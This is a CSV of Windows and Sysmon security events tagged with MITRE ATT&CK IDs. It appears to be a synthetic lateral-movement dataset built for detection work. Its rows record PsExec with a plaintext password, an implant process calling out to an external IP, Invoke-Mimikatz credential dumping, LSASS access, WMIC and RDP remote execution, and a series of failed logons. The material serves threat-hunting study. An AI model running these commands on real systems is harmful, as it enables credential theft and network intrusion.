SystemTime,EventID,Computer,User,RuleName,Image,CommandLine,ParentImage,ParentCommandLine,TargetImage,TargetFilename,TargetObject,Hashes,SourceIp,SourcePort,DestinationIp,DestinationPort,Protocol,Details,GrantedAccess
2024-03-15T09:00:00.001000Z,1,WS01,CORP\svc_backup,technique_id=T1021.002,C:\Windows\System32\cmd.exe,"cmd.exe /c psexec.exe \\WS02 -accepteula -u svc_backup -p Backup@2024 cmd.exe /c whoami",C:\Users\svc_backup\AppData\Roaming\Microsoft\Windows\agent.exe,agent.exe -c 185.220.101.47 -p 443,,,,,,,,,,,
2024-03-15T09:00:05.441000Z,1,WS01,CORP\svc_backup,technique_id=T1021.002,C:\Windows\System32\cmd.exe,"psexec.exe \\WS02 -accepteula -u svc_backup -p Backup@2024 cmd.exe /c whoami",C:\Windows\System32\cmd.exe,"cmd.exe /c psexec.exe \\WS02",,,,,,,,,,,
2024-03-15T09:00:08.223000Z,5140,WS02,CORP\svc_backup,technique_id=T1021.002,,,,,,,,,,,,,,Share Name: \\WS02\ADMIN$,
2024-03-15T09:00:08.334000Z,5140,WS02,CORP\svc_backup,technique_id=T1021.002,,,,,,,,,,,,,,Share Name: \\WS02\IPC$,
2024-03-15T09:00:10.115000Z,7045,WS02,CORP\svc_backup,technique_id=T1021.002,,,,,,,,,,,,,,Service Name: PSEXESVC Service File Name: %SystemRoot%\PSEXESVC.exe,
2024-03-15T09:00:12.889000Z,4624,WS02,CORP\svc_backup,technique_id=T1021.002,,,,,,,,,,,,,,"LogonType: 3 Account Name: svc_backup Account Domain: CORP Source Network Address: 192.168.10.101 Authentication Package: NTLM",
2024-03-15T09:00:15.003000Z,4624,WS02,CORP\svc_backup,technique_id=T1021.002,,,,,,,,,,,,,,"LogonType: 3 Logon Type: 3 Account Name: svc_backup Account Domain: CORP Source Network Address: 192.168.10.101 Authentication Package: NTLM admin",
2024-03-15T09:00:20.551000Z,1,WS02,CORP\svc_backup,technique_id=T1003.001,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -nop Invoke-Mimikatz -Command sekurlsa::logonpasswords",C:\Windows\PSEXESVC.exe,PSEXESVC.exe,,,,,,,,,,,
2024-03-15T09:00:25.112000Z,10,WS02,CORP\svc_backup,technique_id=T1003.001,,,,,,C:\Windows\System32\lsass.exe,,,,,,,,,"GrantedAccess: 0x1410"
2024-03-15T09:01:00.001000Z,1,WS01,CORP\svc_backup,technique_id=T1021.001,C:\Windows\System32\mstsc.exe,"mstsc.exe /v:192.168.10.102 /f",C:\Users\svc_backup\AppData\Roaming\Microsoft\Windows\agent.exe,agent.exe -c 185.220.101.47 -p 443,,,,,,,,,,,
2024-03-15T09:01:10.334000Z,4624,WS03,CORP\mrodriguez,technique_id=T1021.001,,,,,,,,,,,,,,"LogonType: 10 Account Name: mrodriguez Account Domain: CORP RemoteInteractive Source Network Address: 192.168.10.101 Authentication Package: Negotiate",
2024-03-15T09:01:15.223000Z,4624,WS03,CORP\mrodriguez,technique_id=T1021.001,,,,,,,,,,,,,,"LogonType: 10 Account Name: mrodriguez Account Domain: CORP RemoteInteractive Source Network Address: 192.168.10.101 Authentication Package: Negotiate",
2024-03-15T09:02:00.001000Z,1,WS03,CORP\mrodriguez,technique_id=T1047,C:\Windows\System32\wmic.exe,"wmic.exe /node:SRV-FILE01 /user:mrodriguez process call create cmd.exe /c whoami",C:\Windows\System32\cmd.exe,"cmd.exe /c wmic /node:SRV-FILE01",,,,,,,,,,,
2024-03-15T09:02:05.334000Z,4624,SRV-FILE01,CORP\mrodriguez,technique_id=T1047,,,,,,,,,,,,,,"LogonType: 3 Account Name: mrodriguez Account Domain: CORP Source Network Address: 192.168.10.102 Authentication Package: NTLM admin",
2024-03-15T09:02:08.772000Z,5140,SRV-FILE01,CORP\mrodriguez,technique_id=T1021.002,,,,,,,,,,,,,,Share Name: \\SRV-FILE01\C$,
2024-03-15T09:02:10.115000Z,5140,SRV-FILE01,CORP\mrodriguez,technique_id=T1021.002,,,,,,,,,,,,,,Share Name: \\SRV-FILE01\ADMIN$,
2024-03-15T09:02:15.001000Z,1,SRV-FILE01,CORP\mrodriguez,technique_id=T1021.002,C:\Windows\System32\cmd.exe,"cmd.exe /c dir C:\Finance\Payroll /s",C:\Windows\System32\wmic.exe,"wmic.exe process call create",,,,,,,,,,,
2024-03-15T09:02:30.441000Z,4648,WS03,CORP\mrodriguez,technique_id=T1550.002,,,,,,,,,,,,,,Target Server Name: DC01.corp.local network remote,
2024-03-15T09:02:35.334000Z,4624,DC01,CORP\mrodriguez,technique_id=T1021.002,,,,,,,,,,,,,,"LogonType: 3 Account Name: mrodriguez Account Domain: CORP Source Network Address: 192.168.10.102 Authentication Package: NTLM admin Administrators",
2024-03-15T09:02:40.115000Z,5140,DC01,CORP\mrodriguez,technique_id=T1021.002,,,,,,,,,,,,,,Share Name: \\DC01\ADMIN$,
2024-03-15T09:02:41.223000Z,5140,DC01,CORP\mrodriguez,technique_id=T1021.002,,,,,,,,,,,,,,Share Name: \\DC01\C$,
2024-03-15T09:02:42.334000Z,5140,DC01,CORP\mrodriguez,technique_id=T1021.002,,,,,,,,,,,,,,Share Name: \\DC01\IPC$,
2024-03-15T09:02:45.001000Z,7045,DC01,CORP\mrodriguez,technique_id=T1021.002,,,,,,,,,,,,,,Service Name: REMCOMSVC Service File Name: cmd.exe powershell,
2024-03-15T09:03:00.001000Z,4625,SRV-FILE01,CORP\admintest,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: admintest Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:05.441000Z,4625,SRV-FILE01,CORP\administrator,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: administrator Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:10.334000Z,4625,SRV-FILE01,CORP\dadmin,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: dadmin Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:15.223000Z,4625,SRV-FILE01,CORP\backup_svc,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: backup_svc Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:20.112000Z,4625,SRV-FILE01,CORP\helpdesk,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: helpdesk Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:25.001000Z,4625,SRV-FILE01,CORP\nwilson,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: nwilson Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:30.441000Z,4625,SRV-FILE01,CORP\rbrown,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: rbrown Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:35.334000Z,4625,SRV-FILE01,CORP\tsmith,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: tsmith Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
2024-03-15T09:03:40.223000Z,4625,SRV-FILE01,CORP\ljones,technique_id=T1110,,,,,,,,,,,,,,"LogonType: 10 Account Name: ljones Account Domain: CORP Source Network Address: 192.168.10.102 RemoteInteractive",
